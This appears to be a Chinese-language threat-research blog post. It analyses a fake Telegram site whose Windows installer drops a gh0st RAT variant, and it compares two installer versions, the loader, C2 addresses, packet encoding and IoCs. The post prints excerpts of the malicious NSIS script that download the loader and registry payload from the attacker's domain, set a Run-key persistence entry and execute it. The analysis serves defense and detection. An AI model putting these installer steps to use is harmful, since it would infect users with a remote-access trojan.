+<p>網站首頁就有各版本的下載連結，但其中首頁下載 <code>Telegram for Mac</code> 和 <code>Telegram for windows</code> 的連結都會是下載被加料過的 Windows 安裝程式（寫這篇文章的時候下載的檔案是 <code>tsetup.2.1.10.exe</code>）。點選 Android 或 iPhone 的版本會到另一個下載的頁面：</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p2.png" title="Figure 2. 下載頁面" data-caption="Figure 2. 下載頁面" data-fancybox="default"><img class="fig-img" src="p2.png" alt="Figure 2. 下載頁面"></a><span class="caption">Figure 2. 下載頁面</span></div>
+<p>這邊就有些不同了：</p>
+<ul>
+<li>iPhone 下載的連結會連回到正常的 Apple App Store <code>https://apps.apple.com/app/telegram-messenger/id686449807</code></li>
+<li>Android 版本會到另一個連結下載檔案 <code>https://telegrcn.org/download/telegramCN_631.apk</code></li>
+<li>Mac 版本會到另一個連結下載檔案 <code>https://telegrcn.org/download/tsetup.2.1.10.dmg</code></li>
+<li>Windows 版本跟首頁下載的檔案一樣</li>
+</ul>
+<p>接下來這篇文章會只針對 Windows 的版本敘述，這個假的網站在今年 9 月時就已經在 Twitter 上有相關的討論，Android 版本的 APK 也已知是假的 APP，我在快分析完了才查到這個資料 😢，再次學到教訓把頭埋進逆向之前還是要好好的把訊息蒐集跟調查做好。</p>
+
+<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Interesting, signed, low detected &quot;telegram_setup.2.1.6.exe&quot;: 8c957cfced1bcf7803f810d6ae5a6d13cce005637be3ed40a311793419cd92c1<br>From: http://telegram-vip[.]com/telegram_setup.2.1.6.exe<br>Seems some Chinese speaker made malware, targeting Chinese people.<br>🤔<br>cc <a target="_blank" rel="noopener" href="https://twitter.com/JAMESWT_MHT?ref_src=twsrc%5Etfw">@JAMESWT_MHT</a> <a target="_blank" rel="noopener" href="https://twitter.com/cyb3rops?ref_src=twsrc%5Etfw">@cyb3rops</a> <a target="_blank" rel="noopener" href="https://t.co/5jAtnQCkjx">pic.twitter.com/5jAtnQCkjx</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a target="_blank" rel="noopener" href="https://twitter.com/malwrhunterteam/status/1310508328041283584?ref_src=twsrc%5Etfw">September 28, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+
+<p>不過雖然已經有討論串出現，但現在看到的版本已經來到了 <code>2.1.10</code>，這讓我好奇想要來比較一下跟九月時的 <code>2.1.6</code> 版本有了什麼變化。接下來會用我手上有的 <code>telegram_setup.2.1.10.exe</code> 跟我在 ANY.RUN 這個<a target="_blank" rel="noopener" href="https://app.any.run/tasks/aeb405ec-3fea-475f-9050-5ad0a5cf1c61/">分析</a>找到的 <code>telegram_setup.2.1.6.exe</code> 相關檔案來做比較。</p>
+<h2 id="重新打包加料過的安裝程式"><a href="#重新打包加料過的安裝程式" class="headerlink" title="重新打包加料過的安裝程式"></a>重新打包加料過的安裝程式</h2><table>
+<thead>
+<tr>
+<th>Filename</th>
+<th>SHA256</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>telegram_setup.2.1.6.exe</td>
+<td>1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8</td>
+</tr>
+<tr>
+<td>telegram_setup.2.1.10.exe</td>
+<td>35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba</td>
+</tr>
+</tbody></table>
+<p>這兩個安裝程式都是用 NSIS (<a target="_blank" rel="noopener" href="https://nsis.sourceforge.io/Main_Page">nullsoft scriptable install system</a>) 打包的，可以利用 7-zip 直接解壓縮就能得到還原的安裝腳本 <code>[NSIS].nsi</code>。7-zip 在 <code>9.33</code> 的版本加入了自動反編譯 NSIS 腳本的功能，但又在 <code>15.06</code> 把這個功能拿掉了，所以要注意 7-zip 版本必須介於這兩者之間。</p>
+<p>解開以後兩個版本的目錄結構如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">2.1.6/</span><br><span class="line">├── $PLUGINSDIR                        // NSIS 相關的檔案</span><br><span class="line">│   ├── InstallOptions.dll</span><br><span class="line">│   ├── ioSpecial.ini</span><br><span class="line">│   ├── LangDLL.dll</span><br><span class="line">│   ├── modern-wizard.bmp</span><br><span class="line">│   └── TextReplace.dll</span><br><span class="line">├── C                                  // 安裝過程中會直接複製到對應的位置的檔案</span><br><span class="line">│   └── PerfLog</span><br><span class="line">│       ├── AddInProcess.exe           // Backdoor (Loader)</span><br><span class="line">│       └── AddInProcess.exe.config</span><br><span class="line">├── [NSIS].nsi                         // 7-zip 解出來的 NSIS 腳本</span><br><span class="line">├── ns.reg                             // Payload Registry File</span><br><span class="line">├── Telegram.exe                       // Telegram Desktop 2.1.6.0</span><br><span class="line">├── uninst.exe.nsis</span><br><span class="line">└── Updater.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2.1.10/</span><br><span class="line">├── $PLUGINSDIR                        // NSIS 相關的檔案</span><br><span class="line">│   ├── InetLoad.dll</span><br><span class="line">│   ├── InstallOptions.dll</span><br><span class="line">│   ├── ioSpecial.ini</span><br><span class="line">│   ├── LangDLL.dll</span><br><span class="line">│   ├── modern-wizard.bmp</span><br><span class="line">│   ├── System.dll</span><br><span class="line">│   └── TextReplace.dll</span><br><span class="line">├── [NSIS].nsi                         // 7-zip 解出來的 NSIS 腳本</span><br><span class="line">├── Telegram.exe                       // Telegram Desktop 2.1.6.0</span><br><span class="line">├── uninst.exe.nsis</span><br><span class="line">└── Updater.exe</span><br></pre></td></tr></table></figure>
+
+<p>對比兩個版本可以很明顯的注意到 <code>2.1.10</code> 少了 <code>C:\PerfLog</code> 跟 <code>ns.reg</code> 關鍵的後門檔案，<code>2.1.6</code> 很直接的就把這些檔案一起打包，<code>2.1.10</code> 改變方式，利用 NSIS 腳本在安裝過程中才將這兩個檔案下載下來，這可以在 <code>[NSIS].nis</code> 腳本中看到，下面是從 <code>2.1.10</code> 的 <code>[NSIS].nsi</code> 腳本中節錄部份相關的指令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Download loader and registry file</span></span><br><span class="line">InetLoad::load /BANNER <span class="string">&quot;&quot;</span> <span class="string">&quot;Cameron Diaz download in progress, please wait ;)&quot;</span> http://www.telegram-vip.com/index2.php cnPath.exe</span><br><span class="line">InetLoad::load /BANNER <span class="string">&quot;&quot;</span> <span class="string">&quot;Cameron Diaz download in progress, please wait ;)&quot;</span> http://www.telegram-vip.com/index3.php ns.reg</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Replace 123456 to &lt;ComputerName&gt; from ns.reg then use regedit.exe to import</span></span><br><span class="line">ReadRegStr <span class="variable">$R1</span> HKLM SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName ComputerName</span><br><span class="line">TextReplace::_FindInFile /NOUNLOAD <span class="variable">$INSTDIR</span>\ns.reg 123456 /S=1</span><br><span class="line">TextReplace::_ReplaceInFile /NOUNLOAD <span class="variable">$INSTDIR</span>\ns.reg <span class="variable">$INSTDIR</span>\ns.reg 123456 <span class="variable">$R1</span> <span class="string">&quot;/S=1 /C=1 /AO=1&quot;</span></span><br><span class="line">Exec <span class="string">&quot;regedit.exe /s $\&quot;<span class="variable">$INSTDIR</span>\ns.reg$\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Move $INSTDIR\cnPath.exe to C:\PerfLog\AddInProcess.exe</span></span><br><span class="line">StrCpy <span class="variable">$R0</span> <span class="variable">$INSTDIR</span>\cnPath.exe</span><br><span class="line">StrCpy <span class="variable">$R1</span> C:\PerfLog\AddInProcess.exe</span><br><span class="line">System::Call <span class="string">&quot;Kernel32::MoveFileA(t R0,t R1)&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Setup service registry and run</span></span><br><span class="line">WriteRegStr HKCU Software\Microsoft\Windows\CurrentVersion\Run telegramCnService C:\PerfLog\AddInProcess.exe</span><br><span class="line">ExecShell <span class="string">&quot;&quot;</span> C:\PerfLog\AddInProcess.exe</span><br></pre></td></tr></table></figure>
+<p>基本上看完 NSIS 腳本就能了解它的感染手段跟持久化的方式。</p>
+<h2 id="載入器-AddInProcess-exe"><a href="#載入器-AddInProcess-exe" class="headerlink" title="載入器 AddInProcess.exe"></a>載入器 AddInProcess.exe</h2><p>知道安裝過程動的手腳以後，目標就很明確了，<code>AddInProcess.exe</code> 跟寫入的 Registry 資料。</p>
+<table>
+<thead>
+<tr>
+<th>Filename</th>
+<th>SHA256</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AddInProcess.exe (2.1.6)</td>
+<td>f853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063</td>
+</tr>
+<tr>
+<td>AddInProcess.exe (2.1.10)</td>
+<td>379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811</td>
+</tr>
+</tbody></table>
+<p>基本上兩個的函式內容並沒有不同，僅有 metadata 改變而已，File Version 從 <code>1.0.0.0</code> 變成 <code>1.3.0.0</code>。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p3.png" title="Figure 3. 兩者的檔案基本訊息" data-caption="Figure 3. 兩者的檔案基本訊息" data-fancybox="default"><img class="fig-img" src="p3.png" alt="Figure 3. 兩者的檔案基本訊息"></a><span class="caption">Figure 3. 兩者的檔案基本訊息</span></div>
+<div class="figure center" style="width:;"><a class="fancybox" href="p4.png" title="Figure 4. 相同的 .NET 函式結構" data-caption="Figure 4. 相同的 .NET 函式結構" data-fancybox="default"><img class="fig-img" src="p4.png" alt="Figure 4. 相同的 .NET 函式結構"></a><span class="caption">Figure 4. 相同的 .NET 函式結構</span></div>
+<div class="figure center" style="width:;"><a class="fancybox" href="p5.png" title="Figure 5. 相同的 Main 函式" data-caption="Figure 5. 相同的 Main 函式" data-fancybox="default"><img class="fig-img" src="p5.png" alt="Figure 5. 相同的 Main 函式"></a><span class="caption">Figure 5. 相同的 Main 函式</span></div>
+
+<p>從 Figure 5. 的 Main 函式就可以知道，<code>AddInProcess.exe</code> 只是個載入器，真正的內容在安裝時匯入的 registry 資料裡，位在 <code>HKEY_CURRENT_USER\Software\&lt;COMPUTERNAME&gt;</code>裡面是 base64 編碼過的 DLL 和一個 ip 位址。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p6.png" title="Figure 6. Registry 的內容" data-caption="Figure 6. Registry 的內容" data-fancybox="default"><img class="fig-img" src="p6.png" alt="Figure 6. Registry 的內容"></a><span class="caption">Figure 6. Registry 的內容</span></div>
+
+<h2 id="Assembly-Load-Malware-dll"><a href="#Assembly-Load-Malware-dll" class="headerlink" title="Assembly.Load(Malware.dll)"></a>Assembly.Load(Malware.dll)</h2><p>藉助 .NET 的 <code>Assembly.Load</code> 函式可以動態載入另一個 .NET 的 DLL，也就是 registry 的內容，我們可以提取出來進一步分析。</p>
+<table>
+<thead>
+<tr>
+<th>Filename</th>
+<th>Compile Time</th>
+<th>SHA256</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ns.reg (2.1.6)</td>
+<td>N&#x2F;A</td>
+<td>96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22</td>
+</tr>
+<tr>
+<td>registry.bin (2.1.6)</td>
+<td>2020-09-23T09:43:39</td>
+<td>7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a</td>
+</tr>
+<tr>
+<td>ns.reg (2.1.10)</td>
+<td>N&#x2F;A</td>
+<td>d620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a</td>
+</tr>
+<tr>
+<td>registry.bin (2.1.10)</td>
+<td>2020-09-28T18:16:01</td>
+<td>e60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>PDB Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>D:\source\MyJob\反射dll\ConsoleApplication2\obj\Release\反射.pdb</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>這兩個 ns.reg 都維持 “123456” 並未被修改成 computer name 前的狀態。</p>
+</blockquote>
+<p>提取出來的 .NET DLL 擁有相同的函式。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p7.png" title="Figure 7. registry.bin 的函式" data-caption="Figure 7. registry.bin 的函式" data-fancybox="default"><img class="fig-img" src="p7.png" alt="Figure 7. registry.bin 的函式"></a><span class="caption">Figure 7. registry.bin 的函式</span></div>
+
+<p>其中僅有 Main 函式，和寫死在 <code>ClassBuff</code> 其中的 <code>dlldata</code> 有差異。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p8.png" title="Figure 8. registry.bin (2.1.6) 的 Main 函式" data-caption="Figure 8. registry.bin (2.1.6) 的 Main 函式" data-fancybox="default"><img class="fig-img" src="p8.png" alt="Figure 8. registry.bin (2.1.6) 的 Main 函式"></a><span class="caption">Figure 8. registry.bin (2.1.6) 的 Main 函式</span></div>
+<div class="figure center" style="width:;"><a class="fancybox" href="p9.png" title="Figure 9. registry.bin (2.1.10) 的 Main 函式" data-caption="Figure 9. registry.bin (2.1.10) 的 Main 函式" data-fancybox="default"><img class="fig-img" src="p9.png" alt="Figure 9. registry.bin (2.1.10) 的 Main 函式"></a><span class="caption">Figure 9. registry.bin (2.1.10) 的 Main 函式</span></div>
+
+<p>在 <code>2.1.6</code> 的版本中，C2 的 ip 位址是用 <code>Program.GetRegedit()</code> 從 registry 裡面讀出來的，不知道為什麼在 <code>2.1.10</code> 的版本中變成帶入寫死的 base64 字串 <code>MTU0LjIyMi4xMDMuNTg6Nzg3OA==</code> 到 <code>Program.StartWorkThread()</code>。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p10.png" title="Figure 10. registry.bin 的 StartWorkThread 函式" data-caption="Figure 10. registry.bin 的 StartWorkThread 函式" data-fancybox="default"><img class="fig-img" src="p10.png" alt="Figure 10. registry.bin 的 StartWorkThread 函式"></a><span class="caption">Figure 10. registry.bin 的 StartWorkThread 函式</span></div>
+
+<p><code>Program.StartWorkThread()</code> 負責將 C2 的 ip 位址和 port 準備好來接著啟動 <code>Program.MainThread()</code>。這裡比較特別的是這個函式有另一個預設的 C2 ip 位址，當函數被呼叫代入空字串時，便會使用這個 ip。綜合前面看到 <code>Main()</code> 函式裡有個迴圈，在等待 300 秒後便會呼叫 <code>Program.StartWorkThread(&quot;&quot;)</code>，這時便會使用這個 ip 位址。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p11.png" title="Figure 11. registry.bin 的 MainThread 函式" data-caption="Figure 11. registry.bin 的 MainThread 函式" data-fancybox="default"><img class="fig-img" src="p11.png" alt="Figure 11. registry.bin 的 MainThread 函式"></a><span class="caption">Figure 11. registry.bin 的 MainThread 函式</span></div>
+
+<p><code>Program.MainThread()</code> 接著將包含 ip 位址的物件轉為 bytes 後，尋找 <code>ClassBuff().dlldata</code> 裡預設的 <code>255.255.255.255</code> 來覆蓋掉。最後使用 <code>DLLFromMemory</code> 這個 class 在記憶體中直接執行最終的 DLL，export function <code>Launch</code>。</p>
+<h2 id="Hello-gh0st-RAT-DLL"><a href="#Hello-gh0st-RAT-DLL" class="headerlink" title="Hello gh0st RAT DLL"></a>Hello gh0st RAT DLL</h2><table>
+<thead>
+<tr>
+<th>Filename</th>
+<th>Compile Time</th>
+<th>SHA256</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dlldata_2.1.6.bin</td>
+<td>2020-09-23T06:17:16</td>
+<td>e0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0</td>
+</tr>
+<tr>
+<td>dlldata_2.1.10.bin</td>
+<td>2020-09-28T18:15:16</td>
+<td>9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>PDB Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>D:\source\MyJob\企业远程控制\Release\ServerDll.pdb</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>這兩個 DLL 都維持 C2 ip 是 255.255.255.255，還沒被修改前寫死在 registry.bin 的原樣。</p>
+</blockquote>
+<p>最後在記憶體中動態載入的 DLL 是 gh0st RAT 的變種，新舊版本兩者的相似度極高，功能上大致沒有差異。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p12.png" title="Figure 12. dlldata_2.1.6.bin 和 dlldata_2.1.10.bin BinDiff 的比較結果" data-caption="Figure 12. dlldata_2.1.6.bin 和 dlldata_2.1.10.bin BinDiff 的比較結果" data-fancybox="default"><img class="fig-img" src="p12.png" alt="Figure 12. dlldata_2.1.6.bin 和 dlldata_2.1.10.bin BinDiff 的比較結果"></a><span class="caption">Figure 12. dlldata_2.1.6.bin 和 dlldata_2.1.10.bin BinDiff 的比較結果</span></div>
+
+<p>關於 gh0st RAT 的已經有很多很詳細的報告跟原始碼可以閱讀，這邊就不細講最後的這個 DLL。比較值得提的是這個樣本傳送和接收 TCP 封包都有進行簡單的位元運算。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p13.png" title="Figure 13. 收到封包後的編碼動作" data-caption="Figure 13. 收到封包後的編碼動作" data-fancybox="default"><img class="fig-img" src="p13.png" alt="Figure 13. 收到封包後的編碼動作"></a><span class="caption">Figure 13. 收到封包後的編碼動作</span></div>
+<div class="figure center" style="width:;"><a class="fancybox" href="p14.png" title="Figure 14. 送出封包前的編碼動作" data-caption="Figure 14. 送出封包前的編碼動作" data-fancybox="default"><img class="fig-img" src="p14.png" alt="Figure 14. 送出封包前的編碼動作"></a><span class="caption">Figure 14. 送出封包前的編碼動作</span></div>
+
+<p>另外這個 gh0st RAT 變種的 magic header 僅有三個字： <code>203</code> (<code>\x32\x30\x33</code>)，編碼後是 <code>\xCD\xCF\xCE</code>，後面 4 個 bytes 一樣是封包的大小（Figure 15. 的橘色框 <code>\x0F\x03\x00\x00</code>），剩餘資料並未壓縮。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p15.png" title="Figure 15. 原始的封包特徵" data-caption="Figure 15. 原始的封包特徵" data-fancybox="default"><img class="fig-img" src="p15.png" alt="Figure 15. 原始的封包特徵"></a><span class="caption">Figure 15. 原始的封包特徵</span></div>
+
+<h2 id="延伸調查"><a href="#延伸調查" class="headerlink" title="延伸調查"></a>延伸調查</h2><p>以上，關於惡意程式的部份已經瞭解的差不多了，接下來把目光放回到 C2 上面。</p>
+<p>前面分析的過程中得到了這兩個 C2 位址：</p>
+<ul>
+<li><code>154.222.103.58:7878</code><ul>
+<li>第一個 C2 ip，<code>2.1.6</code> 版本是從 registry 讀出來，到了 <code>2.1.10</code> 雖然 registry 裡仍然有一樣的 ip，但樣本內也同時寫死了一樣的 ip（參考 Figure 9.）</li>
+</ul>
+</li>
+<li><code>185.224.168.130:3563</code><ul>
+<li>第二個 C2 ip，等待五分鐘後才連線用的（參考 Figure 10.）</li>
+</ul>
+</li>
+</ul>
+<p>還有最初的假網站 <code>http://telegram-vip.com</code>， A record 是 <code>45.114.106.2</code>。通過 favicon hash 或 HTML body hash 可以找到總共有五個關聯的 ip 都部屬著一樣的假網站：</p>
+<ul>
+<li><code>45.114.106.2</code></li>
+<li><code>45.114.106.3</code></li>
+<li><code>45.114.106.4</code></li>
+<li><code>45.114.106.5</code></li>
+<li><code>45.114.106.6</code></li>
+</ul>
+<p>相關的搜尋特徵：<br><a target="_blank" rel="noopener" href="https://www.shodan.io/search?query=http.favicon.hash:1246367191+country:%22CN%22">https://www.shodan.io/search?query=http.favicon.hash%3A1246367191+country%3A%22CN%22</a><br><a target="_blank" rel="noopener" href="https://censys.io/ipv4?q=f66e0b7ec3a87e950ae989e1825174b43ccd4b56c32963e5c475bead44adf700">https://censys.io/ipv4?q=f66e0b7ec3a87e950ae989e1825174b43ccd4b56c32963e5c475bead44adf700</a></p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p16.png" title="Figure 16. Shodan 針對 favicon hash 的搜尋結果" data-caption="Figure 16. Shodan 針對 favicon hash 的搜尋結果" data-fancybox="default"><img class="fig-img" src="p16.png" alt="Figure 16. Shodan 針對 favicon hash 的搜尋結果"></a><span class="caption">Figure 16. Shodan 針對 favicon hash 的搜尋結果</span></div>
+
+<div class="figure center" style="width:;"><a class="fancybox" href="p17.png" title="Figure 17. Censys 針對 HTTP body hash 的搜尋結果" data-caption="Figure 17. Censys 針對 HTTP body hash 的搜尋結果" data-fancybox="default"><img class="fig-img" src="p17.png" alt="Figure 17. Censys 針對 HTTP body hash 的搜尋結果"></a><span class="caption">Figure 17. Censys 針對 HTTP body hash 的搜尋結果</span></div>
+
+<p>其中 <code>45.114.106.3</code> 有一個 Domain Name <code>telegramsvip.com</code>，看了一下 whois 是 10&#x2F;15 才建的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Domain Name: TELEGRAMSVIP.COM</span><br><span class="line">Registry Domain ID: 2565966013_DOMAIN_COM-VRSN</span><br><span class="line">Registrar WHOIS Server: whois.godaddy.com</span><br><span class="line">Registrar URL: http://www.godaddy.com</span><br><span class="line">Updated Date: 2020-10-15T08:01:06Z</span><br><span class="line">Creation Date: 2020-10-15T08:01:05Z</span><br><span class="line">Registry Expiry Date: 2021-10-15T08:01:05Z</span><br><span class="line">Registrar: GoDaddy.com, LLC</span><br><span class="line">Registrar IANA ID: 146</span><br><span class="line">Registrar Abuse Contact Email: abuse(|]godaddy.com</span><br><span class="line">Registrar Abuse Contact Phone: 480-624-2505</span><br><span class="line">Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited</span><br><span class="line">Domain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited</span><br><span class="line">Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited</span><br><span class="line">Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited</span><br><span class="line">Name Server: NS35.DOMAINCONTROL.COM</span><br><span class="line">Name Server: NS36.DOMAINCONTROL.COM</span><br><span class="line">DNSSEC: unsigned</span><br><span class="line">URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/</span><br><span class="line">&gt;&gt;&gt; Last update of whois database: 2020-10-25T15:39:21Z</span><br></pre></td></tr></table></figure>
+
+<p>甚至還打了 Google 廣告 XD</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p18.jpg" title="Figure 18. Google 搜尋廣告" data-caption="Figure 18. Google 搜尋廣告" data-fancybox="default"><img class="fig-img" src="p18.jpg" alt="Figure 18. Google 搜尋廣告"></a><span class="caption">Figure 18. Google 搜尋廣告</span></div>
+
+<p>相較原先的 <code>telegram-vip.com</code> 是在 09&#x2F;21 就建立了，就在編譯後門的前兩天。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Domain Name: TELEGRAM-VIP.COM</span><br><span class="line">Registry Domain ID: 2561073458_DOMAIN_COM-VRSN</span><br><span class="line">Registrar WHOIS Server: whois.godaddy.com</span><br><span class="line">Registrar URL: http://www.godaddy.com</span><br><span class="line">Updated Date: 2020-10-15T08:03:30Z</span><br><span class="line">Creation Date: 2020-09-21T06:44:59Z</span><br><span class="line">Registry Expiry Date: 2021-09-21T06:44:59Z</span><br><span class="line">Registrar: GoDaddy.com, LLC</span><br><span class="line">Registrar IANA ID: 146</span><br><span class="line">Registrar Abuse Contact Email: abuse(aT&#125;godaddy.com</span><br><span class="line">Registrar Abuse Contact Phone: 480-624-2505</span><br><span class="line">Domain Status: ok https://icann.org/epp#ok</span><br><span class="line">Name Server: NS13.DOMAINCONTROL.COM</span><br><span class="line">Name Server: NS14.DOMAINCONTROL.COM</span><br><span class="line">DNSSEC: unsigned</span><br><span class="line">URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/</span><br><span class="line">&gt;&gt;&gt; Last update of whois database: 2020-10-25T15:40:38Z</span><br></pre></td></tr></table></figure>
+
+<h2 id="小結"><a href="#小結" class="headerlink" title="小結"></a>小結</h2><p>以上便是針對 Windows installer 的部份在分析過程中發現的一些有趣的內容，這個詐騙網站現在還在持續運作中，或許未來還能看到攻擊者對樣本有所更新，再觀察看看。<del>（或是有空也來分析一下那個假的 APK）</del></p>
+<h2 id="IoCs"><a href="#IoCs" class="headerlink" title="IoCs"></a>IoCs</h2><table>
+<thead>
+<tr>
+<th>IP</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>45.114.106.2</td>
+<td>Fake Site</td>
+</tr>
+<tr>
+<td>45.114.106.3</td>
+<td>Fake Site</td>
+</tr>
+<tr>
+<td>45.114.106.4</td>
+<td>Fake Site</td>
+</tr>
+<tr>
+<td>45.114.106.5</td>
+<td>Fake Site</td>
+</tr>
+<tr>
+<td>45.114.106.6</td>
+<td>Fake Site</td>
+</tr>
+<tr>
+<td>154.222.103.58</td>
+<td>gh0st RAT C2</td>
+</tr>
+<tr>
+<td>185.224.168.130</td>
+<td>gh0st RAT C2</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Creation Date</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>telegram-vip.com</td>
+<td>2020-09-21T06:44:59Z</td>
+</tr>
+<tr>
+<td>telegramsvip.com</td>
+<td>2020-10-15T08:01:05Z</td>
+</tr>
+<tr>
+<td>telegrcn.org</td>
+<td>2020-05-19T02:31:56Z</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>SHA256</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8</td>
+<td>telegram_setup.2.1.6.exe</td>
+</tr>
+<tr>
+<td>35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba</td>
+<td>tsetup.2.1.10.exe</td>
+</tr>
+<tr>
+<td>f853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063</td>
+<td>AddInProcess.exe (telegram_setup.2.1.6.exe)</td>
+</tr>
+<tr>
+<td>379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811</td>
+<td>AddInProcess.exe (tsetup.2.1.10.exe)</td>
+</tr>
+<tr>
+<td>96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22</td>
+<td>ns.reg (2.1.6)</td>
+</tr>
+<tr>
+<td>d620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a</td>
+<td>ns.reg (2.1.10)</td>
+</tr>
+<tr>
+<td>7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a</td>
+<td>excracted DLL from ns.reg (2.1.6)</td>
+</tr>
+<tr>
+<td>e60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef</td>
+<td>extracted DLL from ns.reg (2.1.10)</td>
+</tr>
+<tr>
+<td>e0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0</td>
+<td>embedded gh0st RAT DLL (2.1.6)</td>
+</tr>
+<tr>
+<td>9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db</td>
+<td>embedded gh0st RAT DLL (2.1.10)</td>
+</tr>
+<tr>
+<td>19d1ff6bb589fab200f3bced0f148bb5e20fe9b37bd03de9cd425116cc0dba17</td>
+<td>telegramCN_631.apk</td>
